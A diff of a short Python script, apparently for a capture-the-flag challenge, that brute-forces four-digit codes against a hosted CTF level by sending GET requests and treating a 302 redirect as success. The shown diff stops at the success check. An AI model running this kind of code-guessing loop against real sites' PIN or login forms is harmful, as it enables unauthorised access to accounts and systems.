@@ -1,16 +1,18 @@
 import requests
 
 # URL de la page vulnérable
-url = "http://localhost/2bgp-ctf/levels/4/"
+url = "https://target4.2bgp-ctf.vpws.eu/"
 
 # Fonction pour tester un code
 def brute_force_code():
-    for code in range(10000):  # Tous les codes de 0000 à 9999
-        code_str = f"{code:04}"  # Formatage en 4 chiffres (ex: 0001, 0002, etc.)
-        data = {"code": code_str}  # Paramètre POST
+    for code in range(7500, 10000):  # Tous les codes de 7500 à 9999
+        code_str = f"{code:04}"  # Formatage en 4 chiffres (ex: 0000, 0001, etc.)
 
-        # Envoyer la requête sans suivre les redirections automatiquement
-        response = requests.get(url, data=data, allow_redirects=False)
+        # Paramètres de la requête GET
+        params = {"code": code_str}
+
+        # Envoyer la requête GET
+        response = requests.get(url, params=params, allow_redirects=False)
 
         # Vérifier si une redirection se produit (code 302)
         if response.status_code == 302:
